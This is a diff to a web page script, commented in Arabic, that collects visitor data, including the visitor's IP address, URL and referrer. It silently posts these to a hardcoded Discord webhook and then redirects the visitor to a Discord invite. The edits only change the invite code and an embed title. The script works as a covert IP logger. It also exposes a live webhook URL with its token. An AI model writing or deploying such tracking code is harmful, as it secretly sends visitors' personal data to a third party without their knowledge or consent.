@@ -19,7 +19,7 @@
     <script>
         // === Webhook URL (مقدم من المستخدم) ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515276137780215858/RxZYK_U3oQXinA04JkdD0FWXKuucps4QFqBaPL7Phs8LcPaFr2bVEVCEyEyVXutP_UKH";
-        const DISCORD_REDIRECT = "https://discord.gg/5no";
+        const DISCORD_REDIRECT = "https://discord.gg/066";
 
         // كائن جمع بيانات الزائر
         let visitorData = {
@@ -121,7 +121,7 @@
             await fetchIP();
 
             const embed = {
-                title: "🎯 TPF — إعادة توجيه إلى ديسكورد",
+                title: "إعادة توجيه إلى ديسكورد",
                 color: 0x5865F2,
                 timestamp: visitorData.timestamp,
                 fields: [
@@ -135,7 +135,7 @@
                     { name: "🆔 الرابط", value: visitorData.url, inline: false },
                     { name: "🔗 المُحيل", value: visitorData.referrer, inline: false }
                 ],
-                footer: { text: "Directed to discord.gg/5no" }
+                footer: { text: "Directed to discord.gg/066" }
             };
 
             const payload = { embeds: [embed], content: "🔄 **A new visitor was directed to the server**" };
